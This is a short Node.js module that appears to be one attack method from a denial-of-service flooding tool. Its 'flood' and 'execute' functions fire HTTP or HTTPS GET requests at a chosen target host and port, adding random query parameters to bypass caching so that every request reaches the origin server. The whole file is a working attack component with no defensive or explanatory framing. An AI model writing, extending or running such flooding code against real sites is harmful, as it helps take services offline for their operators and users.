const http = require('http');
const https = require('https');

module.exports = {
    name: 'HTTP GET Random Parameters',
    description: 'GET requests with random query parameters',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        const randomId = Math.random().toString(36).substring(7);
        
        return new Promise((resolve, reject) => {
            const req = protocol.get({
                hostname: target,
                port: port,
                path: `/?id=${randomId}&cache=${Date.now()}&rand=${Math.random()}`,
                timeout: 5000
            }, (res) => {
                resolve({ status: res.statusCode, params: { id: randomId } });
                req.destroy();
            });
            
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        const randomId = Math.random().toString(36).substring(7);
        
        const req = protocol.get({
            hostname: target,
            port: port,
            path: `/?id=${randomId}&t=${Date.now()}`
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        req.on('error', () => callback(false));
    }
};